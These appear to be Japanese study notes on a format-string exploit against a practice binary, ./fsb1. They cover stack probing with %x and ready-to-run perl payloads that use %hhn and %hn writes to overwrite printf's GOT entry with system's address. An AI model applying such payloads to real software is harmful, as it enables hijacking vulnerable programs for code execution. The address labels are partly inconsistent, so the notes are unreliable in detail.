system@libc
0xf7e53310
\x10\x33\xe5\xf7

/bin/sh@libc
0xf7f7384c
\x4c\x38\xf7\xf7

printf@got
0x08048372
\x72\x83\x04\x08

洗い出し
　　%○$x
　　○番目のスタックをx(16進数)で吐き出し
　　もちろんリトルエンディアン考慮

　　%nは一度のprintfでの出力された文字数を引き継ぐ
　　すでに目的の数値を超えてしまってる場合は繰り上がりによるオーバーフローを狙う
　　（はりねずみ本 p.120）

  　特定のアドレスから\x00までの読み出しは"[任意のアドレス(リトルエンディアン)] + %n$s(nは自身の位置)"

流れ
  　入力文字列がスタックのどこにあるか探す
　　　→AAAA.%x.%x.%x.%x
　　　→AAAA%4$x

検証
　  メタキャラ$に注意
　  perl や echo で入力するときは$は\$にすること必須
　  最初たまたま16バイトが一致してるので%256xは実際必要ない
　  2バイト使うときはエンディアンに注意（$nで書き込まれるときにエンディアン考慮で書き込むので実際には意識せずおｋ）

[1バイト]

system@plt
\x10\x33\xe5\xf7

printf@got
\x0c\xa0\x04\x08

"\x0c\xa0\x04\x08" . "\x0d\xa0\x04\x08" . "\x0e\xa0\x04\x08" . "\x0f\xa0\x04\x08"
"%256x" . "%7$hhn" .
"%35x"  . "%8$hhn" .
"%178x" . "%9$hhn" .
"%18x"  . "%10$hhn"

(perl -e 'print "\x0c\xa0\x04\x08" . "\x0d\xa0\x04\x08" . "\x0e\xa0\x04\x08" . "\x0f\xa0\x04\x08" . "%256x"  . "%7\$hhn" . "%35x"  . "%8\$hhn" . "%178x" . "%9\$hhn" . "%18x"  . "%10\$hhn" . "\n"';cat) | ./fsb1


[2バイト]

system@plt
0xf7e53310
\x10\x33\xe5\xf7

printf@got
\x0c\xa0\x04\x08

"\x0c\xa0\x04\x08" . "\x0e\xa0\x04\x08"
"%13064x" . "%7\$hn" .
"%50389x" . "%8\$hn"

(perl -e 'print "\x0c\xa0\x04\x08" . "\x0e\xa0\x04\x08" . "%13064x" . "%7\$hn" . "%50389x" . "%8\$hn" . "\n"';cat) | ./fsb1

